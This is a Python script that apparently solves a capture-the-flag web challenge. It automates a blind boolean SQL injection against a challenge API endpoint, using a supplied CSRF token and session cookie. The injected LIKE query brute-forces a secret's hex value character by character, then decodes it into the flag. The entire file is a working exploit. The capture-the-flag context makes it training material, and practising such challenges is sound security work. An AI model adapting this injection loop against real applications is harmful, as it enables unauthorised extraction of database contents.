import requests as r
from colorama import Fore

url = "http://web-17.challs.olicyber.it/api/blind"

def main():
    csrftoken = input("[" + Fore.BLUE + "+" + Fore.RESET + "]" + Fore.GREEN + " Enter the X-Csrftoken: " + Fore.YELLOW)
    
    headers = {'X-Csrftoken': csrftoken}
    
    session = input(Fore.RESET + "[" + Fore.BLUE + "+" + Fore.RESET + "]" + Fore.GREEN + " Enter the session cookie: " + Fore.YELLOW)
    
    print("[" + Fore.GREEN + "+" + Fore.RESET + "]" + Fore.GREEN + " searching the flag..." + Fore.RESET)
    s = r.Session()
    s.cookies.set('session', session)
    dictionary = '0123456789abcdef'
    result = ''
    while True:
        for i in dictionary:
            question = f"1' AND (SELECT 1 FROM secret WHERE HEX(asecret) LIKE '{result+i}%')='1"
            response = str(s.post(url, json={'query': question}, headers=headers).json()['result'])
            if response == "Success":
                result += i
                break
        else:
            break
    flag = str(bytes.fromhex(result).decode('utf-8'))
    return flag

if __name__ == "__main__":
    flag = main()
    if "flag" in flag:
    	print("[" + Fore.GREEN + "+" + Fore.RESET + "]" + Fore.GREEN + " Flag found!" + Fore.RESET)
    	print("[" + Fore.GREEN + "+" + Fore.RESET + "]" + Fore.GREEN + " Flag: " + Fore.YELLOW + flag + Fore.RESET)
    else:
    	print("[" + Fore.RED + "+" + Fore.RESET + "]" + Fore.RED + " Flag not found" + Fore.RESET)
    	print("[" + Fore.BLUE + "*" + Fore.RESET + "]" + Fore.YELLOW + "Possible problem with the X-Csrftoken" + Fore.RESET)
